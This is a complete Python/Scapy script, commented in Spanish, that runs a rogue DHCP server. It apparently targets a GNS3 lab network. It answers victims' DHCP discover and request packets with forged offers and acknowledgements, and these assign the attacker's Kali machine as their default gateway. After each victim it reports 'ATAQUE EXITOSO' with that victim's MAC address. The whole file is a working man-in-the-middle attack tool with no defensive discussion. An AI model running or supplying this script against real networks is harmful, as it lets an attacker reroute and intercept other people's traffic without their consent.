#!/usr/bin/env python3
import sys
from scapy.all import *

interface = "eth0"

# ==========================================================
# CONFIGURACIÓN DEL SERVIDOR FALSO
# ==========================================================
fake_ip = "10.25.83.150"       # IP para la PC
fake_router = "10.25.83.12"    # IP de tu Kali (Gateway Falso)
fake_dns = "8.8.8.8"           
subnet_mask = "255.255.255.0"
server_ip = "10.25.83.12"      # IP de tu Kali
# ==========================================================

print(f"[*] Iniciando Servidor DHCP de dos fases para GNS3 en {interface}...")

def dhcp_reply(pkt):
    if pkt.haslayer(DHCP):
        message_type = pkt[DHCP].options[0][1]
        client_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid
        
        # FASE 1: Responder al DISCOVER (1) con un OFFER
        if message_type == 1:
            print(f"[+] Discover detectado de {client_mac}. Enviando Offer...")
            
            offer_pkt = (
                Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
                IP(src=server_ip, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=fake_ip, siaddr=server_ip, chaddr=pkt[BOOTP].chaddr, xid=xid) /
                DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id", server_ip),
                    ("subnet_mask", subnet_mask),
                    ("router", fake_router),
                    ("name_server", fake_dns),
                    ("lease_time", 86400),
                    "end"
                ])
            )
            sendp(offer_pkt, iface=interface, verbose=False)

        # FASE 2: Responder al REQUEST (3) con el ACK (5) definitivo
        elif message_type == 3:
            print(f"[+] Request detectado de {client_mac}. Enviando ACK definitivo...")
            
            ack_pkt = (
                Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
                IP(src=server_ip, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=fake_ip, siaddr=server_ip, chaddr=pkt[BOOTP].chaddr, xid=xid) /
                DHCP(options=[
                    ("message-type", "ack"),
                    ("server_id", server_ip),
                    ("subnet_mask", subnet_mask),
                    ("router", fake_router),
                    ("name_server", fake_dns),
                    ("lease_time", 86400),
                    "end"
                ])
            )
            sendp(ack_pkt, iface=interface, verbose=False)
            print(f"[----------- ¡ATAQUE EXITOSO PARA LA MAC {client_mac}! -----------]\n")

try:
    sniff(iface=interface, filter="udp and port 67", prn=dhcp_reply, store=0)
except KeyboardInterrupt:
    print("\n[-] Servidor DHCP Falso apagado.")
    sys.exit(0)
